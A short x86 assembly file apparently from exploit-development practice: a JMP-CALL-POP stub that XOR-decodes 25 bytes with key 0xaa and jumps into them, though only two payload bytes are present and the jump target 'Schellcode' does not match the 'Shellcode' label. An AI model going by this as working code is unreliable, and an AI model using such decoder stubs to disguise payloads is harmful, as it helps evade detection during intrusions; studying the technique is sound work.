

global _start


section .text

_start:

	jmp short call_decoder
	
decoder:
	pop esi
	xor ecx, ecx
	mov cl, 25
	
decode:
	xor byte [esi], 0xaa
	inc esi
	loop decode
	
	jmp short Schellcode


call_decoder:
	call decoder
Shellcode: db 0x9b,0xfa